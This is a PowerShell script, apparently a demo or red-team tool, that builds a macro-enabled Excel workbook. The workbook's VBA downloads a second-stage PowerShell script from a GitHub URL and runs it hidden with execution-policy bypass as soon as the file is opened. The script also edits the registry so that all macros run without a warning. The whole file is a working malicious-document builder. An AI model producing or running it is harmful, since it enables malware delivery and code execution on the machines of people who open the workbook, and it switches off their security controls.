$xlsmContent = @"
Option Explicit

Public Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
    Alias "URLDownloadToFileA" ( _
    ByVal pCaller As LongPtr, _
    ByVal szURL As String, _
    ByVal szFileName As String, _
    ByVal dwReserved As LongPtr, _
    ByVal lpfnCB As LongPtr) As LongPtr

Sub DownloadAndRunPowerShellScript()
    Dim URL As String
    Dim LocalFilePath As String
    Dim DownloadStatus As LongPtr
    
    URL = "https://raw.githubusercontent.com/JaBarosin/demos/master/dev_info.ps1"
    LocalFilePath = "C:\temp\dev_login_info_stage_2.ps1"
    
    DownloadStatus = URLDownloadToFile(0, URL, LocalFilePath, 0, 0)
    
    If DownloadStatus = 0 Then
        RunPowerShellScript LocalFilePath
    Else
        MsgBox "Error downloading the PowerShell script. Please check the URL and try again."
    End If
End Sub

Sub RunPowerShellScript(FilePath As String)
    Dim PowerShellCommand As String
    Dim Shell As Object
    
    PowerShellCommand = "powershell.exe -ExecutionPolicy Bypass -File """ & FilePath & """"
    
    Set Shell = CreateObject("WScript.Shell")
    Shell.Run PowerShellCommand, 0, True
    Set Shell = Nothing
End Sub
"@

$xlsmContent = $xlsmContent -replace "`r`n", "`n"

$Excel = New-Object -ComObject Excel.Application
$Workbook = $Excel.Workbooks.Add()
$ExcelModule = $Workbook.VBProject.VBComponents.Add(1)
$ExcelModule.CodeModule.AddFromString($xlsmContent)
$Last = $ExcelModule.CodeModule.CountOfLines
$ExcelModule.CodeModule.DeleteLines($Last, 1)
$Workbook.SaveAs("C:\temp\demosheet1.xlsm", 52) # Change the path to your desired location
$Workbook.Close($false)
$Excel.Quit()


$VBAcode = @"
Private Sub Workbook_Open()
    DownloadAndRunPowerShellScript
End Sub
"@

$VBAcode = $VBAcode -replace "`r`n", "`n"

$filePath = "C:\temp\demosheet1.xlsm"

$Excel = New-Object -ComObject Excel.Application
$Excel.Visible = $false
$Excel.EnableEvents = $false
$Workbook = $Excel.Workbooks.Open($filePath)
$VBProject = $Workbook.VBProject

$ThisWorkbook = $VBProject.VBComponents.Item("ThisWorkbook")
$LineNum = $ThisWorkbook.CodeModule.CountOfLines + 1
$ThisWorkbook.CodeModule.InsertLines($LineNum, $VBAcode)

$Workbook.Save()
$Workbook.Close($true)
$Excel.Quit()
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Office\16.0\Excel\Security" -Name "VBAwarnings" -Value 1
